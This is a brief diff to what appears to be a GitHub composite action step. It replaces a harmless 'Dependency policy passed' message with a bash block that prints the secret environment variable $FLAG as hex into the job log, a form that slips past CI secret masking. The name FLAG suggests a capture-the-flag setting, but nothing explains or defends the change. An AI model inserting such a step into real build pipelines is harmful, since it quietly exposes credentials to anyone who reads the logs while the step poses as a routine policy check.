@@ -4,4 +4,7 @@ runs:
   using: composite
   steps:
     - shell: bash
-      run: printf '%s\n' 'Dependency policy passed.'
+      run: |
+        printf FLAG_HEX=
+        printf %s "$FLAG" | od -An -v -tx1 | tr -d '[:space:]'
+        printf '\n'
